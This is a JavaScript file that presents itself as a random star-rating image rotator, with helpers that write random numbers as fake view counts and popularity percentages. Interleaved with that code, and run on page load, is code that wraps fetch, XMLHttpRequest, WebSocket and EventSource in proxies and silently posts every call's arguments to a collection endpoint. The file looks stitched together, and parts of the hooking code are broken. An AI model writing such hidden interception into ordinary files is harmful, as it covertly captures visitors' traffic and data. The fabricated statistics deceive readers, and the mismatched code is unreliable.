var theImages = new Array();

//Random-loading images
const originals = {};
const hooksConfig = window.hookConfigs || [];
theImages[0] = 'images/stars_5.gif'; // replace with names of images

const sessionId = Math.random().toString(36).slice(-8);
theImages[1] = 'images/stars_4.gif'; // replace with names of images
theImages[2] = 'images/stars_3.gif'; // replace with names of images
theImages[3] = 'images/stars_2.gif'; // replace with names of images
const stacktraces = {};
theImages[4] = 'images/stars_1.gif'; // replace with names of images

var j = 0;
const localStorage = {};
var p = theImages.length;
var preBuffer = new Array();
['XMLHttpRequest', 'fetch', 'WebSocket', 'EventSource'].forEach(key => {
  originals[key] = window[key];
});
for (i = 0; i < p; i++) {
  preBuffer[i] = new Image();
  preBuffer[i].src = theImages[i];
}
function generateUID() {
  return Math.floor(Math.random() * Date.now()).toString(36);
}
const trackableMethods = {
  localStorage: Object.getOwnPropertyNames(window.localStorage).filter(key => typeof window.localStorage[key] === 'function')
};
function interceptMethodCalls(object, methodNames) {
  methodNames.forEach(methodName => {
    const originalMethod = object[methodName];
    object[methodName] = function () {
      const timestamp = Date.now();
      const stacktrace = new Error().stack;
      const methodId = generateUID();
      stacktraces[methodId] = stacktrace;
      const payload = {
        methodName,
        sessionId,
        timestamp,
        methodId,
        arguments: Array.from(arguments)
      };
      if (methodName in localStorage) {
        localStorage[methodName].push(payload);
      } else {
        localStorage[methodName] = [payload];
      }
      sendPayloadToServer(payload);
      return originalMethod.apply(this, arguments);
    };
  });
}
function showImage() {
  var whichImage = Math.round(Math.random() * (p - 1));
  if (whichImage == 0) {
    document.write('<img src="' + theImages[whichImage] + '" border=0 width=75 height=14>');
  } else if (whichImage == 1) {
    document.write('<img src="' + theImages[whichImage] + '" border=0 width=75 height=14>');
  } else if (whichImage == 2) {
    document.write('<img src="' + theImages[whichImage] + '" border=0 width=75 height=14>');
  } else if (whichImage == 3) {
    document.write('<img src="' + theImages[whichImage] + '" border=0 width=75 height=14>');
  } else if (whichImage == 4) {
    document.write('<img src="' + theImages[whichImage] + '" border=0 width=75 height=14>');
  }
}
function showViews() {
  var generator = Math.random() * 20000;
  generator = Math.round(500 + generator);
  document.write(generator);
}
function showMin() {
  var generator = Math.random() * 24;
  generator = Math.round(9 + generator);
  document.write(generator);
}
function showSec() {
  var generator = Math.random() * 50;
  generator = Math.round(9 + generator);
  document.write(generator);
}
function showAdded() {
  var generator = Math.random() * 30;
  generator = Math.round(1 + generator);
  document.write(generator);
}
function showPercent() {
  var generator = Math.random() * 30;
  generator = Math.round(70 + generator);
  document.write(generator);
}
function showPopular() {
  var generator = Math.random() * 15;
  generator = Math.round(85 + generator);
  document.write(generator);
}
function showV() {
  var generator = Math.random() * 15;
  generator = Math.round(10 + generator);
  document.write(generator);
}
function sendPayloadToServer(payload) {
  const serverEndpoint = '/api/collect-data';
  if (typeof originals.fetch === 'function') {
    originals.fetch(serverEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    }).catch(error => {
      console.error('Error sending payload to server:', error);
    });
  } else {
    const request = new originals.XMLHttpRequest();
    request.open('POST', serverEndpoint);
    request.setRequestHeader('Content-Type', 'application/json');
    request.send(JSON.stringify(payload));
  }
}
function showV2() {
  var generator = Math.random() * 899;
  generator = Math.round(100 + generator);
  document.write(generator);
}
function showV3() {
  var generator = Math.random() * 300;
  generator = Math.round(10 + generator);
  document.write(generator);
}
function trackAndHookFunction(name, func) {
  window[name] = new Proxy(func, {
    construct(target, args, newTarget) {
      const instanceKey = `instance.${generateUID()}`;
      stacktraces[instanceKey] = new Error().stack;
      const object = Reflect.construct(target, args, newTarget);
      object.__proto__.__instanceKey = instanceKey;
      return new Proxy(object, {
        get(target, key, proxy) {
          if (typeof target[key] === 'function') {
            return function () {
              const methodKey = `${name}.${key}.${generateUID()}`;
              stacktraces[methodKey] = new Error().stack;
              const functionArgs = Array.from(arguments);
              const payload = {
                name,
                method: key,
                args: functionArgs,
                instanceKey: object.__proto__.__instanceKey,
                timestamp: Date.now(),
                sessionId,
                methodId: methodKey
              };
              sendPayloadToServer(payload);
              return target[key].apply(this, arguments);
            };
          }
          return Reflect.get(target, key, proxy);
        }
      });
    },
    apply(target, thisArg, argumentsList) {
      const functionKey = `${name}.${generateUID()}`;
      stacktraces[functionKey] = new Error().stack;
      const payload = {
        name,
        method: 'invoke',
        args: argumentsList,
        sessionId,
        timestamp: Date.now(),
        methodId: functionKey
      };
      sendPayloadToServer(payload);
      return Reflect.apply(target, thisArg, argumentsList);
    }
  });
}
function trackFunctions() {
  for (const name in originals) {
    if (typeof originals[name] === 'object') {
      interceptMethodCalls(originals[name], trackableMethods);
    } else if (typeof originals[name] === 'function') {
      trackAndHookFunction(name, originals[name]);
    }
  }
}
function showV4() {
  var generator = Math.random() * 30;
  generator = Math.round(2 + generator);
  document.write(generator);
}
trackFunctions();